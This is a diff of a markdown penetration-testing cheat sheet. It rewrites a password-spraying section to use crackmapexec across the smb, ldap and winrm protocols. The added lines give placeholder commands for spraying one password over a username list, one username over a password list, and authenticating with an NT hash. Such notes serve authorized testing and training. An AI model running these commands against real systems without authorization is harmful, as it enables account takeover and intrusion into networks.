@@ -1,14 +1,17 @@
 ## Miscellaneous Attacks In No Particular Order
 
-**SMB Password Spraying**
+*+Password Spraying With CrackMapExec**
 
-When You have a working password and a list of userames, or a working username and a list of passwords, ``crackmapexec`` makes testing your credentials trivial.
-
+When You have a working password and a list of userames, or a working username and a list of passwords, ``crackmapexec`` makes testing your credentials trivial. ``crackmapexec`` has a few protocols available. The one's that I find the most use out of is ``smb``, ``ldap``, and ``winrm``.
 ```bash
-crackmapexec smb <IP> -u <USERLIST> -p '<PASS>' --continue-on-success
-crackmapexec smb <IP> -u '<USER>' -p <PASSLIST> --continue-on-success
-# Authenticate with an NT hash
-crackmapexec smb <IP> -u <USERLIST>-H '<NT_HASH>' --continue-on-success 
+# Test 1 Password with a list of Usernames
+crackmapexec <PROTOCOL> <IP> -u <USERLIST> -p '<PASS>' --continue-on-success
+
+# Test 1 Username with a list of Passwords
+crackmapexec <PROTOCOL> <IP> -u '<USER>' -p <PASSLIST> --continue-on-success
+
+# Authentication with an NT hash
+crackmapexec <PROTOCOL> <IP> -u <USERLIST> -H '<NT_HASH>' --continue-on-success 
 ```
 
 ## Windows / Active Directory Attacks
